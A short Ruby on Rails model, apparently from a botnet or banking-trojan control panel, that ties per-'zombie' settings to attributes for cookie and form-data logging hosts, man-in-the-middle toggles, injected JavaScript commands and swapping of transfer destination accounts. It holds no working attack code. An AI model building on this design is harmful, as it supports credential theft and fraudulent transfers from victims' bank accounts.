class Ccconfig < ActiveRecord::Base
  belongs_to :zombie
  attr_accessible :balancepage,:loginhost,:checksslvar,:cookieloggerhost,:cookieloggingenabled,:enablemitm,:jscommandid,:jscommand,:logoutpostdata,:modifyurl,:myaccount,:newaccount,:origaccount,:origmsg,:postdataloggerhost,:postenabled,:cookielist,:transferurl,:uploadpath,:hashid, :zombie_id, :zombie
end
